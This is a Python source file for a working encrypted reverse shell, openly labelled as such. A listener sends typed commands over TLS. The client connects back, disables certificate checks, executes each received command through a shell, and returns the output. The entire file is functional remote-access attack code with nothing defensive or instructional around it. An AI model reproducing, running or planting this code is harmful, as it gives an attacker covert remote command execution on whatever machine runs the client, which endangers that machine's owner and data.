import argparse
import socket
import ssl
import subprocess
import os
import sys
import time

def run_listener(host, port, certfile, keyfile):
    print("\n" + "="* 50)
    print("      ENCRYPTED REVERSE SHELL - SECURE LISTENER       ")
    print("="* 50)
    print(f"[*] Binding listener to {host}:{port}")

    # setting SSL context for server
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    try:
        context.load_cert_chain(certfile=certfile, keyfile=keyfile)
    except Exception as e:
        print(f"[-] Error loading SSL certificates: {e}")
        print("[*] Tip: You need a certifile and keyfile for TLS encryption.")
        return

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"[*] Waiting for encrypted connection...")

        raw_socket, client_address = server_socket.accept()
        print(f"[+] Connection recieved from {client_address[0]}:{client_address[1]}")

        #wrapping the raw socket with SSL
        conn = context.wrap_socket(raw_socket, server_side=True)
        print(f"[+] SSL handshake successful. Channel is encrypted!")
        print("-" * 50)

        while True:
            command = input("Shell> ")
            if not command.strip():
                continue
            if command.lower() in ["exit", "quit"]:
                conn.sendall(b"exit")
                break

            conn.sendall(command.encode("utf-8"))
            output = conn.recv(4096)
            if not output:
                break
            print(output.decode("utf-8", errors="ignore"))

    except Exception as e:
        print(f"[-] Listener error: {e}")
    finally:
        server_socket.close()
        print("\n[-] Listener closed.")

def run_client(host, port):
    print("\n" + "="* 50)
    print("      ENCRYPTED REVERSE SHELL - CLIENT SIDE       ")
    print("="* 50)
    print(f"[*] Connecting back to {host}:{port}...")

    # setting up SSL context for client
    # disabling strict verification for local self-signed testing
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        raw_socket.connect((host,port))
        conn = context.wrap_socket(raw_socket)
        print("[+] Connected and encrypted successfully!")

        while True:
            data = conn.recv(4096)
            if not data:
                break
            command = data.decode("utf-8", errors= "ignore").strip()

            if command.lower() == "exit":
                break

            # excuting commands locally via subprocess
            try:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout + stderr
                if not output:
                    output = b"[+] Command executed with no output.\n"

            except Exception as e:
                output = f"[-] Execution error: {str(e)}\n".encode("utf-8")

            conn.sendall(output +b"\n")

    except Exception as e:
        print(f"[-] Client error: {e}")
    finally:
        raw_socket.close()
        print(f"[-] Connection terminated")

def main():
    parser = argparse.ArgumentParser(description= "Encrypted Reverse Shell Utility")
    parser.add_argument("--mode",choices=["listener", "client"],required=True , help="Run as listener or client")
    parser.add_argument("--host",default="127.0.0.1", help="Target/Listen IP address")
    parser.add_argument("-p","--port",type=int, default=4433, help="Port to use (default: 4433)")
    parser.add_argument("--cert",default="cert.pem", help="SSL certificate file (for listener)")
    parser.add_argument("--key",default="key.pem", help="SSL Private key file (for listen)")

    args = parser.parse_args()

    if args.mode == "listener":
        run_listener(args.host, args.port, args.cert, args.key)
    elif args.mode == "client":
        run_client(args.host, args.port)

if __name__ == "__main__":
    main()